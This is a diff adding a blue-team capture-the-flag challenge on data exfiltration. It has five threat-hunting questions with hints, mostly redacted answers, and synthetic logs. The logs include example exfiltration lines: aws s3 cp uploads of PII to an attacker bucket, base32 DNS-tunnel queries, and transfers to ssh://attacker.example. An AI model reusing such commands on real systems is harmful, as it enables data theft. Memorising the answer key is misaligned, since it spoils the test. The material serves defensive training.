@@ -1,0 +1,110 @@
+# ATT&CK TA0010 — Exfiltration mini-campaign.
+
+slug: tier-2-exfiltration
+title: "Tier 2: Exfiltration"
+description: |
+  Same intrusion, five departments. The attacker tried five different
+  exfiltration paths to get data out. Identify the technique used
+  from each affected host.
+category: Threat Hunting
+team: blue
+difficulty: 3
+points: 450
+flag: "CTF{REDACTED}"
+tactic_id: TA0010
+docker_port: 2222
+profile: default-strict
+
+techniques:
+  - id: T1041
+    description: |
+      Exfiltration Over C2 Channel — the established HTTPS C2 also
+      ferries out a 240 MB dump.
+    question:
+      prompt: |
+        On host FINANCE-2 the C2 channel exfiltrated approximately
+        how many MB? (Integer, no units.)
+      hint: |
+        proxy.log — sum bytes_out for the host's beacon domain.
+        Spike from the usual ~500-byte beacon size is the giveaway.
+      answer: 240
+
+  - id: T1048.003
+    description: |
+      Exfiltration Over Alternative Protocol — DNS A queries with
+      base32 payloads to a different external NS.
+    question:
+      prompt: |
+        On host RND-7 which DNS record type is the attacker abusing
+        for the alternative exfiltration channel? (Upper-case
+        three-letter type, e.g. `TXT`.)
+      hint: |
+        dns_queries.log — RND-7's queries land on an unfamiliar
+        SLD with a single record type repeated.
+      answer: REDACTED
+
+  - id: T1567.002
+    description: |
+      Exfiltration to Cloud Storage — aws s3 cp to an attacker
+      bucket.
+    question:
+      prompt: |
+        What is the AWS S3 bucket name the attacker uploaded to
+        from host HR-3? (Just the bucket name, no s3:// prefix.)
+      hint: |
+        cli_history.log — search for aws s3 cp commands.
+      answer: REDACTED
+
+  - id: T1029
+    description: |
+      Scheduled Transfer — exfiltration happens only between 02:00
+      and 03:00 UTC to blend with backup traffic.
+    question:
+      prompt: |
+        Between which two UTC hours does the attacker schedule
+        their daily exfiltration on host LEGAL-1? Answer as
+        HH:MM-HH:MM in 24-hour format.
+      hint: |
+        timeline.log on LEGAL-1 — the exfil transfers all
+        share an identical hour window.
+      answer: REDACTED
+
+  - id: T1020
+    description: |
+      Automated Exfiltration — a script wakes on file-create in a
+      watched folder and ships every new doc straight to attacker
+      infra without human input.
+    question:
+      prompt: |
+        On host MARKETING-2 the automated exfiltration script
+        monitors which folder for new files? (Full path as in
+        watcher.log.)
+      hint: |
+        watcher.log — line with `watch_path=…` and `event=created`.
+      answer: REDACTED
+
+logs:
+  proxy.log: |
+    2026-05-15T10:00:00Z host=FINANCE-2 dst=REDACTED verb=POST bytes_out=512 verdict=allow
+    2026-05-15T10:01:00Z host=FINANCE-2 dst=REDACTED verb=POST bytes_out=498 verdict=allow
+    2026-05-15T10:42:18Z host=FINANCE-2 dst=REDACTED verb=POST bytes_out=251658240 verdict=allow note=spike
+    2026-05-15T10:43:18Z host=FINANCE-2 dst=REDACTED verb=POST bytes_out=502 verdict=allow
+  dns_queries.log: |
+    2026-05-15T11:01:11Z host=RND-7 type=REDACTED qname=KFXGM33OOJSWG5DZN5XXIYTBONXG65Z3.exfil-aaaa.example
+    2026-05-15T11:01:13Z host=RND-7 type=REDACTED qname=MFRGGZBAONUWO33QPF2GQ43FN5XGKZBZ.exfil-aaaa.example
+    2026-05-15T11:01:15Z host=RND-7 type=REDACTED qname=K5UWS43FNRZGS5DBORZGI5DJN5XGSZZ.exfil-aaaa.example
+    2026-05-15T11:02:01Z host=RND-7 type=A qname=corp-mail.corp.local
+  cli_history.log: |
+    2026-05-15T09:48:11Z host=HR-3 user=svc_hr cmd="aws --profile attacker s3 cp pii_dump.csv s3://REDACTED/dumps/pii_dump_20260515.csv"
+    2026-05-15T09:50:22Z host=HR-3 user=svc_hr cmd="aws --profile attacker s3 cp salaries.xlsx s3://REDACTED/dumps/salaries_20260515.xlsx"
+    2026-05-15T11:18:42Z host=HR-3 user=svc_hr cmd="aws s3 ls s3://corp-backups-prod/"
+  timeline.log: |
+    2026-05-12T02:14:01Z host=LEGAL-1 event=exfil_transfer destination=ssh://attacker.example bytes=84512000
+    2026-05-13T02:08:18Z host=LEGAL-1 event=exfil_transfer destination=ssh://attacker.example bytes=72148000
+    2026-05-13T11:11:32Z host=LEGAL-1 event=backup_transfer destination=backup.corp.local bytes=4124000000 note=corp_backup_job
+    2026-05-14T02:24:55Z host=LEGAL-1 event=exfil_transfer destination=ssh://attacker.example bytes=68291000
+    2026-05-15T02:42:11Z host=LEGAL-1 event=exfil_transfer destination=ssh://attacker.example bytes=91408000
+  watcher.log: |
+    2026-05-15T08:00:00Z host=MARKETING-2 event=watcher_start script=C:\Tools\reportr.py watch_path="REDACTED"
+    2026-05-15T11:42:18Z host=MARKETING-2 event=created path="REDACTED\Q2-funnel-2026.pptx" size=4148000
+    2026-05-15T11:42:24Z host=MARKETING-2 event=auto_upload destination="https://collab-share.example/d/abc123" bytes=4148000
